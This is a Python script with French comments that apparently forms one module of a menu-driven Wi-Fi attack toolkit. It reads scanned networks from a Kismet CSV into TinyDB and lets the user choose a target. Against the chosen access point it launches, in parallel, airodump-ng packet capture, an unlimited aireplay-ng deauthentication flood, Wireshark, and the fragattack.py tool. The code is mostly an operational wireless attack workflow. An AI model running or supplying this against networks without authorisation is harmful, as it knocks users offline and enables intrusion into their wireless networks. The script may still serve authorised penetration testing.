import csv
from tinydb import TinyDB, Query
import os
import subprocess
from multiprocessing import Process

def lancer_airodump_ng(channel, bssid):
    command_airodump = ['x-terminal-emulator', '-e', 'airodump-ng', 'wlan0', '-w', 'captureDatagramme', '-c', channel, '--bssid', bssid]
    print("Commande airodump_ng :", " ".join(command_airodump))
    subprocess.call(command_airodump)

def lancer_aireplay_ng(bssid):
    command_aireplay = ['x-terminal-emulator', '-e', 'aireplay-ng', '-deauth', '0', '-a', bssid, 'wlan0']
    print("Commande aireplay-ng :", " ".join(command_aireplay))
    subprocess.call(command_aireplay)

def verifier_fichier_capture():
    file_list = ['captureDatagramme-01.csv', 'captureDatagramme-01.kismet.csv',
                 'captureDatagramme-01.kismet.netxml',
                 'captureDatagramme-01.log.csv']
    for file_name in file_list:
        if os.path.exists(file_name):
            os.remove(file_name)
def verifier_fichier_capture_all():
    file_list = ['captureDatagramme-01.cap', 'captureDatagramme-01.csv', 'captureDatagramme-01.kismet.csv',
                 'captureDatagramme-01.kismet.netxml',
                 'captureDatagramme-01.log.csv']
    for file_name in file_list:
        if os.path.exists(file_name):
            os.remove(file_name)

def lancer_wireshark_capture():
    command_wireshark = ['wireshark', 'captureDatagramme-01.cap']
    subprocess.Popen(command_wireshark)

def lancer_fragattack():
    n = 1  # Nombre de niveaux à remonter à partir du répertoire courant
    current_directory = os.getcwd()
    parent_directory = current_directory
    for _ in range(n):
        parent_directory = os.path.dirname(parent_directory)
    for root, dirs, files in os.walk(parent_directory):
        if 'services' in dirs:
            fileWireshark_dir = os.path.join(root, 'services')
            build_sh_path = os.path.join(fileWireshark_dir, 'captureDatagramme-01.cap')
            if os.path.isfile(build_sh_path):
                print(f"Fichier captureDatagramme-01.cap trouvé dans {fileWireshark_dir}")
                break

    n = 1  # Nombre de niveaux à remonter à partir du répertoire courant
    current_directory = os.getcwd()
    parent_directory = current_directory
    for _ in range(n):
        parent_directory = os.path.dirname(parent_directory)
    for root, dirs, files in os.walk(parent_directory):
        if 'research' in dirs:
            research_dir = os.path.join(root, 'research')
            build_sh_path = os.path.join(research_dir, 'fragattack.py')
            if os.path.isfile(build_sh_path):
                print(f"Exécution de fragattack dans {research_dir}")
                os.chdir(research_dir)
                command_fragattack = ['python', 'fragattack.py', fileWireshark_dir+'/captureDatagramme-01.cap']
                print("Commande fragattack :", " ".join(command_fragattack))
                subprocess.Popen(command_fragattack)
                break

# Vérification de l'existence de la base de données
db_file = 'database.json'

verifier_fichier_capture_all()

if os.path.exists(db_file):
    os.remove(db_file)

# Création d'une nouvelle base de données
db = TinyDB(db_file)

# Lecture du fichier "out-01.csv-01.kismet.csv"
filename = "out-01.csv-01.kismet.csv"

if os.path.exists(filename):
    with open(filename, 'r') as file:
        reader = csv.DictReader(file, delimiter=';')
        sequence_number = 1

        for row in reader:
            if row is not None and any(row.values()):
                # Supprimer les espaces supplémentaires dans les clés et les valeurs
                row = {k.strip(): v.strip() for k, v in row.items()}

                # Ajouter le numéro de séquence
                row['Sequence'] = sequence_number

                # Insérer les données dans la base de données
                db.insert(row)

                sequence_number += 1
else:
    print(f"il faut lancer l'option [2] Scan network avant [3] Retrieve MAC address by BSSID")
    print()
    input("Appuyez sur Entrée pour continuer...")
    exit()  # Arrêter le programme si le fichier n'existe pas

# Fermeture de la base de données
db.close()

# Supprimer les fichiers
file_list = ['out-01.csv-01.cap', 'out-01.csv-01.csv', 'out-01.csv-01.kismet.netxml', 'out-01.csv-01.log.csv', 'out-01.csv-01.kismet.csv']
for file_name in file_list:
    if os.path.exists(file_name):
        os.remove(file_name)

# Relire la base de données
db = TinyDB(db_file)
table = db.table('_default')

# Récupération de toutes les données de la base de données
data = table.all()

# Trier les données par numéro de séquence
sorted_data = sorted(data, key=lambda x: x['Sequence'])

# Affichage des données en colonnes
print("{:<12s} {:<20s} {:<10s} {:<30s} {:<8s} {:<12s}".format("Num. Seq.", "BSSID", "NetType", "ESSID", "Channel", "Encryption"))
for item in sorted_data:
    print("{:<12d} {:<20s} {:<10s} {:<30s} {:<8s} {:<12s}".format(item['Sequence'], item['BSSID'], item['NetType'], item['ESSID'], item['Channel'], item['Encryption']))

# Demande de saisie du numéro de séquence
print(" ")
sequence_input = input("Veuillez saisir un numéro de séquence : ")

# Recherche et affichage des données correspondantes au numéro de séquence
results = table.search(Query().Sequence == int(sequence_input))
if results:
    print("Données correspondantes :")
    for result in results:
        print(result)

    # Récupération des informations de l'enregistrement choisi
    record = results[0]
    bssid = record['BSSID']
    channel = record['Channel']

    # Lancement des commandes en parallèle
    process_airodump = Process(target=lancer_airodump_ng, args=(channel, bssid))
    process_aireplay = Process(target=lancer_aireplay_ng, args=(bssid,))
    process_wireshark = Process(target=lancer_wireshark_capture)
    process_fragattack = Process(target=lancer_fragattack)

    # Démarrage des processus
    process_airodump.start()
    process_aireplay.start()
    process_wireshark.start()
    process_fragattack.start()

    # Lancement du processus pour vérifier la création du fichier
    process_verifier_capture = Process(target=verifier_fichier_capture)
    process_verifier_capture.start()

    # Attendre que les processus se terminent
    process_airodump.join()
    process_aireplay.join()
    process_wireshark.join()
    process_fragattack.join()
    process_verifier_capture.join()
else:
    print("Aucune donnée correspondante pour le numéro de séquence saisi.")
